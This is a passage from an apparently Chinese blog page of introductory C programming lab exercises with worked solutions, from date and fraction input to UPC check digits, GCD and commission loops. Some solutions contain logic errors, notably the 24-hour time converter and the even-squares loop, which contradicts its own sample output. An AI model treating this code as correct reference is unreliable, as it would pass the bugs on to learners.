loan);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="日期格式转化（Date-Format-Convention）"><a href="#日期格式转化（Date-Format-Convention）" class="headerlink" title="日期格式转化（Date Format Convention）"></a>日期格式转化（Date Format Convention）</h3><blockquote><p>编写一个程序，以月&#x2F;日&#x2F;年（即 mm&#x2F;dd&#x2F;yy）的格式接受用户录入的日期信息，并以年月日（即yyyymmdd）的格式将其显示出来。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a date (mm&#x2F;dd&#x2F;yyyy): 2&#x2F;17&#x2F;2011<br>You entered the date 20110217</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> m, d, y;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a date (mm/dd/yyyy): &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d/%d/%d&quot;</span>, &amp;m, &amp;d, &amp;y);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You entered the date %04d%02d%02d&quot;</span>, y, m, d);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分数加法（Fraction-Addition）"><a href="#分数加法（Fraction-Addition）" class="headerlink" title="分数加法（Fraction Addition）"></a>分数加法（Fraction Addition）</h3><blockquote><p>修改如下程序，使用户可以同时输入两个分数，中间用加号隔开：</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter two fractions separated by a plus sign: 5&#x2F;6+3&#x2F;4<br>The sum is 38&#x2F;24</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> num1, denom1, num2, denom2, result_num, result_denom;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter two fractions separated by a plus sign: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d/%d+%d/%d&quot;</span>, &amp;num1, &amp;denom1, &amp;num2, &amp;denom2);<br><br>    result_num = num1 * denom2 + num2 * denom1;<br>    result_denom = denom1 * denom2;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The sum is %d/%d\n&quot;</span>, result_num, result_denom);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h2><h3 id="24小时制-12小时制转换-24-hour-to-12-hour"><a href="#24小时制-12小时制转换-24-hour-to-12-hour" class="headerlink" title="24小时制-12小时制转换(24-hour to 12-hour)"></a>24小时制-12小时制转换(24-hour to 12-hour)</h3><blockquote><p>编写一个程序，要求用户输入 24 小时制的时间，将其转换为 12 小时制的格式。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a 24-hour time: 21:11<br>Equivalent 12-hour time: 9:11 PM</p></blockquote><blockquote><p>Enter a 24-hour time: 0:01<br>Equivalent 12-hour time: 12:01 AM</p></blockquote><p>注意，不要把12:00显示为0:00。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> a, b;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a 24-hour time: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d:%d&quot;</span>, &amp;a, &amp;b);<br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">13</span>)<br>    &#123;<br>        a -= <span class="hljs-number">12</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Equivalent 12-hour time: %d:%02d PM&quot;</span>, a, b);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">12</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Equivalent 12-hour time: %d:%02d PM&quot;</span>, a, b);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (a &lt; <span class="hljs-number">1</span>)<br>    &#123;<br>        a += <span class="hljs-number">12</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Equivalent 12-hour time: %d:%02d AM&quot;</span>, a, b);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Equivalent 12-hour time: %d:%02d AM&quot;</span>, a, b);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="风速等级与描述（Wind-Speed）"><a href="#风速等级与描述（Wind-Speed）" class="headerlink" title="风速等级与描述（Wind Speed）"></a>风速等级与描述（Wind Speed）</h3><blockquote><p>下面是用于测量风力等级的简化版，编写一个程序，要求用户输入风速（海里&#x2F;小时），然后显示相应的描述。</p><table><thead><tr><th align="center">速率（海里&#x2F;⼩时）</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">小于 1</td><td align="center">Calm（无风）</td></tr><tr><td align="center">1~3</td><td align="center">Light air（轻风）</td></tr><tr><td align="center">4~27</td><td align="center">Breeze（微风）</td></tr><tr><td align="center">28~47</td><td align="center">Gale（⼤风）</td></tr><tr><td align="center">48~63</td><td align="center">Storm（暴风）</td></tr><tr><td align="center">⼤于63</td><td align="center">Hurricane（飓风）</td></tr></tbody></table><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a wind speed: 1</p><p>Light air</p></blockquote><blockquote><p>Enter a wind speed: 27</p><p>Breeze</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> rate;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a wind speed: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;rate);<br>    <span class="hljs-keyword">if</span> (rate &lt; <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Calm&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rate &lt;= <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Light air&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rate &lt;= <span class="hljs-number">27</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Breeze&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rate &lt;= <span class="hljs-number">47</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Gale&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rate &lt;= <span class="hljs-number">63</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Storm&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hurricane&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="通用产品代码（UPC-Universal-Production-Code）"><a href="#通用产品代码（UPC-Universal-Production-Code）" class="headerlink" title="通用产品代码（UPC, Universal Production Code）"></a>通用产品代码（UPC, Universal Production Code）</h3><blockquote><p>修改如下程序，使其可以检测 UPC 的有效性。在用户输入UPC后，程序将输出 VALID 或 NOT VALID 。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter the first (single) digit: 0<br>Enter first group of five digits: 13800<br>Enter second group of five digits: 15173<br>Enter the last (single) digit: 5<br>VALID</p></blockquote><blockquote><p>Enter the first (single) digit: 0<br>Enter first group of five digits: 51500<br>Enter second group of five digits: 24128<br>Enter the last (single) digit: 7<br>NOT VALID</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* upc.c</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Computes a universal product code check digit</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> d, i1, i2, i3, i4, i5, j1, j2, j3, j4, j5, first_sum, second_sum, total, check;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the first (single) digit:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%1d&quot;</span>, &amp;d);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the first group of five digits:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%1d%1d%1d%1d%1d&quot;</span>, &amp;i1, &amp;i2, &amp;i3, &amp;i4, &amp;i5);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the second group of five digits:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%1d%1d%1d%1d%1d&quot;</span>, &amp;j1, &amp;j2, &amp;j3, &amp;j4, &amp;j5);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the last (single) digit: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;check);<br>    first_sum = d + i2 + i4 + j1 + j3 + j5;<br>    second_sum = i1 + i3 + i5 + j2 + j4;<br>    total = <span class="hljs-number">3</span> * first_sum + second_sum;<br><br>    check == <span class="hljs-number">9</span> - ((total - <span class="hljs-number">1</span>) % <span class="hljs-number">10</span>) ? <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VALID\n&quot;</span>) : <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NOT VALID\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="将百分制转换为等级制（Centesimal-grade-to-Letter-grade）"><a href="#将百分制转换为等级制（Centesimal-grade-to-Letter-grade）" class="headerlink" title="将百分制转换为等级制（Centesimal-grade to Letter-grade）"></a>将百分制转换为等级制（Centesimal-grade to Letter-grade）</h3><blockquote><p>利用switch语句编写一个程序，把用数字表示的成绩转化为字母表示的等级。</p><p>使用下面的等级评定规则：A为90<del>100，B为80</del>89，C为70<del>79，D为60</del>69，F为0~59。如果成绩大于100或小于0显示出错信息。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter numerical grade: 84<br>Letter grade: B</p></blockquote><blockquote><p>Enter numerical grade: -1<br>Error, grade must be between 0 and 100.</p></blockquote><p>提示：把成绩拆分成 2 个数字，然后使用 switch 语句判定十位上的数字。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> grade;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter numerical grade: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;grade);<br>    <span class="hljs-keyword">if</span> (grade &lt; <span class="hljs-number">0</span> || grade &gt; <span class="hljs-number">100</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error, grade must be between 0 and 100.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    grade /= <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">switch</span> (grade)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">10</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: A&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: A&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: B&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: C&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: D&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error, grade must be between 0 and 100.\n&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="最大公约数（GCD-Greatest-Common-Divisor）"><a href="#最大公约数（GCD-Greatest-Common-Divisor）" class="headerlink" title="最大公约数（GCD, Greatest Common Divisor）"></a>最大公约数（GCD, Greatest Common Divisor）</h3><blockquote><p>编写程序，要求用户输入两个整数，然后计算这两个整数的最大公约数（GCD, Greatest Common Divisor）。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter two integers: 12 28<br>Greatest common divisor: 4</p></blockquote><blockquote><p>Enter two integers：1 9<br>Greatest common divisor：1</p></blockquote><p>提示：求最大公约数的经典算法 Euclid 算法如下：<br>分别让变量 m 和 n 存储两个整数。如果 n 为 0，那么停止操作，m 中的值是 GCD ；否则计算 m 除以 n 的余数，把 n 保存到 m 中，并把余数保存到 n 中；重复上述操作，每次都先判断n是否为 0 。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getGCD</span><span class="hljs-params">(<span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> m;<br><br>    <span class="hljs-keyword">return</span> getGCD(n, m % n);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> m, n;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter two integers: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;m, &amp;n);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Greatest common divisor: %d&quot;</span>, getGCD(m, n));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="股经纪人的佣金（Brokerage）"><a href="#股经纪人的佣金（Brokerage）" class="headerlink" title="股经纪人的佣金（Brokerage）"></a>股经纪人的佣金（Brokerage）</h3><blockquote><p>在下列程序中添加循环，以便用户可以输入多笔交易并且程序可以计算每次的佣金。程序在用户输入的交易额为 0 时终止。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter value of trade: 30000<br>Commission：$166.00</p></blockquote><blockquote><p>Enter value of trade: 20000<br>Commission：$144.00</p></blockquote><blockquote><p>Enter value of trade: 0</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * broker.c</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">fff</span><span class="hljs-params">(<span class="hljs-type">float</span> value)</span><br>&#123;<br><br>    <span class="hljs-type">float</span> commission;<br>    <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">2500.00f</span>)<br>        commission = <span class="hljs-number">30.00f</span> + <span class="hljs-number">.017</span>f * value;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">6250.00f</span>)<br>        commission = <span class="hljs-number">56.00f</span> + <span class="hljs-number">.0066</span>f * value;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">20000.00f</span>)<br>        commission = <span class="hljs-number">76.00f</span> + <span class="hljs-number">.0034</span>f * value;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">50000.00f</span>)<br>        commission = <span class="hljs-number">100.00f</span> + <span class="hljs-number">.0022</span>f * value;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">500000.00f</span>)<br>        commission = <span class="hljs-number">155.00f</span> + <span class="hljs-number">.0011</span>f * value;<br>    <span class="hljs-keyword">else</span><br>        commission = <span class="hljs-number">255.00f</span> + <span class="hljs-number">.0009</span>f * value;<br><br>    <span class="hljs-keyword">if</span> (commission &lt; <span class="hljs-number">39.00f</span>)<br>        commission = <span class="hljs-number">39.00f</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Commission: $%.2f\n\n&quot;</span>, commission);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">float</span> value;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter value of trade: &quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;value);<br>        <span class="hljs-keyword">if</span> (!value)<br>            <span class="hljs-keyword">break</span>;<br><br>        fff(value);<br>        <span class="hljs-type">char</span> c = getchar();<br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="偶数平方（Square-of-Even-Number）"><a href="#偶数平方（Square-of-Even-Number）" class="headerlink" title="偶数平方（Square of Even Number）"></a>偶数平方（Square of Even Number）</h3><blockquote><p>编写程序，提示用户输入一个数 n，然后显示出 1~n 的所有偶数的平方值。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a number: 100<br>4<br>16<br>36<br>64<br>100</p></blockquote><blockquote><p>Enter a number: 50<br>4<br>16<br>36</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> n, i = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a number: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br>    <span class="hljs-keyword">while</span> (i * i &lt; n)<br>    &#123;<br>        i += <span class="hljs-number">2</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i * i);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="日历（Calendar-Month）"><a href="#日历（Calendar-Month）" class="headerlink" title="日历（Calendar Month）"></a>日历（Calendar Month）</h3><blockquote><p>编写程序显示单月的日历。用户指定这个月的天数和该月起始日是星期几。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter number of days in month: 31</p><p>Enter starting day of the week(1&#x3D;Sun, 7&#x3D;Sat): 3</p></blockquote><table><thead><tr><th align="center">日</th><th align="center">一</th><th align="center">二</th><th align="center">三</th><th align="center">四</th><th align="center">五</th><th align="center">六</th></tr></thead><tbody><tr><td align="center"></td><td align="center"></td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td></tr><tr><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">10</td><td align="center">11</td><td align="center">12</td></tr><tr><td align="center">13</td><td align="center">14</td><td align="center">15</td><td align="center">16</td><td align="center">17</td><td align="center">18</td><td align="center">19</td></tr><tr><td align="center">20</td><td align="center">21</td><td align="center">22</td><td align="center">23</td><td align="center">24</td><td align="center">25</td><td align="center">26</td></tr><tr><td align="center">27</td><td align="center">28</td><td align="center">29</td><td align="center">30</td><td align="center">31</td><td align="center"></td><td align="center"></td></tr></tbody></table></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span 